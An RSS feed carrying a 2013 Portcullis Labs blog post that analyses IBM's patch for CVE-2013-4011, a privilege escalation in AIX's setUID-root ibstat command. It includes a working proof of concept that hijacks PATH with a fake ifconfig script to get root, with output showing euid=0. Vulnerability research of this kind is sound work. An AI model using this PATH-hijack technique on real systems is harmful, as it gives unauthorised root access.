<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs &#187; CVE-2013-4011</title>
	<atom:link href="https://portcullislabs.github.io/tag/cve-2013-4011/feed/" rel="self" type="application/rss+xml" />
	<link>https://portcullislabs.github.io</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</title>
		<link>https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/</link>
		<comments>https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/#comments</comments>
		<pubDate>Sat, 20 Jul 2013 11:01:33 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[AIX]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[CVE-2013-4011]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[root]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=1151</guid>
		<description><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting advisory come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting <a title="advisory" href="http://aix.software.ibm.com/aix/efixes/security/infiniband_advisory.asc">advisory</a> come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided to take it for a spin.<span id="more-1151"></span></p>
<p>The advisory concerned AIX (one of my favourite operating systems to pwn) and related to a potential privilege escalation vulnerability in AIX 6.1 and AIX 7.1&#8242;s ibstat command which has setUID root permissions set on it. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release.</p>
<p>It&#8217;s fair to say that there are a substantial number of such vulnerabilities in AIX 7.1 but my interest was peaked because it wasn&#8217;t one that we&#8217;d found.</p>
<p>To start with, I grabbed a copy of the efix and extracted it. You&#8217;ll notice that the tarball referenced within the advisory contains patches for all supported AIX releases which are delivered as compressed epkg files. It might not be immediately clear but these are actually just tarballs with some meta data describing the patched files. So let&#8217;s extract one and take a look:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ tar xvf iv43580m2a.130619.epkg
x ./ecfile, 837 bytes, 2 media blocks.
...
x ./EFILE1, 47516 bytes, 93 media blocks.
x ./EFILE2, 17576 bytes, 35 media blocks.
...
$ cat ecfile
...
EFIX_FILE:
EFIX_FILE_NUM=1
...
TARGET_FILE=/usr/sbin/ibstat
...
EFIX_FILE:
EFIX_FILE_NUM=2
...
TARGET_FILE=/usr/sbin/arp.ib
...
</pre>
<p>I&#8217;ve stripped out the less interesting bits of ecfile but we can clearly see that this patches two files, /usr/sbin/ibstat and /usr/sbin/arp.ib.</p>
<p>So the next question is that have they actually changed? My first thought was to objdump the two binaries and compare the output. This should give us a clear idea of what libc function calls are being utilised (and thus what the vulnerability is likely to be) however they had been stripped of all symbols which would make this a long and tedious process. So what else can we do? Well, knowing what classes of vulnerability AIX commonly falls foul of, I figured there was a reasonable likelihood that the vulnerability pertained to some kind of command injection, so I ran strings across the vulnerable binary to see if it was possible in this case:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ strings /usr/sbin/ibstat
@(#)23 1.5 src/bos/usr/ccs/lib/libpthreads/init.c, libpth, bos53H, h2006_10B1 3/5/06 21:33:24
...
ifconfig %s
...
</pre>
<p>It certainly looked like this was a possibility, however I wanted to be sure. My next step was to run strings across the new binary and compare the output. For this, I used kompare:</p>
<div id="attachment_1152" style="width: 310px" class="wp-caption alignnone"><a href="https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-removed-from-the-binary/" rel="attachment wp-att-1152"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/07/missingcommands-300x37.png" alt="Commands that have been removed from the binary" width="300" height="37" class="size-medium wp-image-1152" /></a><p class="wp-caption-text">Commands that have been removed from the binary</p></div>
<div id="attachment_1153" style="width: 310px" class="wp-caption alignnone"><a href="https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-added-to-the-binary/" rel="attachment wp-att-1153"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/07/replacedcommands-300x45.png" alt="Commands that have been added to the binary" width="300" height="45" class="size-medium wp-image-1153" /></a><p class="wp-caption-text">Commands that have been added to the binary</p></div>
<p>Now we can quite clearly see what has changed. It appears that in the vulnerable binary certain system commands are called, without a fully qualified path. What does this mean? Well, unless the ibstat binary correctly sanitises the PATH environment variable when it is called then binaries such as arp etc will be called by ibstat from the first matching directory specified in PATH.</p>
<p>What this means is that we can provide our own malicious binaries in a location which we control and have them executed as root when we run the ibstat binary (as it has setUID root permissions set).</p>
<p>We can prove this as follows:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ls -l dummybin/
total 8
lrwxrwxrwx 1 user staff 8 Jul 20 09:59 arp -&gt; ifconfig
-rwxr-xr-x 1 user staff 49 Jul 20 10:55 ifconfig
lrwxrwxrwx 1 user staff 8 Jul 20 09:59 lsattr -&gt; ifconfig
$ cat dummybin/ifconfig
#!/bin/sh

echo $0
echo $1
echo $2
id
sleep 1000
$ PATH=/home/user/ibstat/dummybin:/usr/bin:/etc:/usr/sbin:/usr/ucb /usr/sbin/ibstat -a lo0

===============================================================================
IB INTERFACE ARP TABLE
===============================================================================
/home/user/ibstat/dummybin/arp
-t
ib
uid=208(user) gid=1(staff) euid=0(root)
</pre>
<p>And there you have it, euid=0 in under half an hour.</p>
<p>If you enjoyed this write up be sure to get yourself a ticket for <a title="44CON" href="http://shop.44con.com/collections/44con-tickets">44CON</a> where I will be presenting the next round of our more detailed research into modern POSIX alike OS, including how I uncovered potentially exploitable bugs in ~400 Debian GNU/Linux packages in a single day.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
